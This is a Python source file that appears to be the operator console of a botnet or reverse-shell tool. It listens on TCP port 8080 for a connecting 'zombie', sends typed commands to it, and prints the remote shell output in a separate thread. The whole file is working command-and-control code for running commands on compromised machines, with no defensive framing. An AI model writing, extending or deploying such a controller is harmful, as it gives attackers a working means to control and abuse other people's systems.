"""
    Main code
    Handles startup, main control loop, calls to other functions, etc
"""

from time import sleep
import threading
# import my own code
import utils


"""
    Class to output data from the zombie command line to the screen
    This runs as its own thread to not block anything else and better handle fragmented and continuous output
"""
class cmdOutputThread (threading.Thread):
    def __init__(self, sock):
        threading.Thread.__init__(self, daemon=True)
        self.sock = sock
        self.cmdList = []
        self.cmdLock = threading.Lock()

    def addCommand(self, cmd):
        self.cmdLock.acquire()
        self.cmdList.append(cmd)
        self.cmdLock.release()

    def run(self):
        data = ''
        out = ''
        while True:
            try:
                # get data from the socket and convert it to a string
                data = self.sock.recv(4096)
                if not data:
                    break
                out = str(data, 'UTF-8')
                # strip previous commands from the output - prevent echoing sent commands
                self.cmdLock.acquire()
                for cmd in self.cmdList:
                    if cmd in out:
                        out = out.replace(cmd, '')
                        self.cmdList.remove(cmd)
                self.cmdLock.release()
                # print without a newline and flush the output to make sure it gets printed immediately
                print(out, end="", flush=True)
            except Exception as inst:
                print(type(inst))
                print(inst.args)
                print(inst)
                sleep(10)

"""
    Main function
"""
def main():
    # wait for a zombie to connect
    cmdSock = utils.receiveTCP(8080)

    # start a thread to print the command line output
    cmdThread = cmdOutputThread(cmdSock)
    cmdThread.start()

    #main command loop
    cmd = input('')
    while cmd != '#exit':
        if(not cmd.startswith('#')):
            cmdThread.addCommand(cmd + '\n')
        cmdSock.sendall(cmd.encode('UTF-8') + b'\n\0')
        cmd = input('')

    # send the exit command and close the command socket
    cmdSock.sendall(cmd.encode('UTF-8') + b'\n\0')
    cmdSock.close()

if __name__ == "__main__":
    main()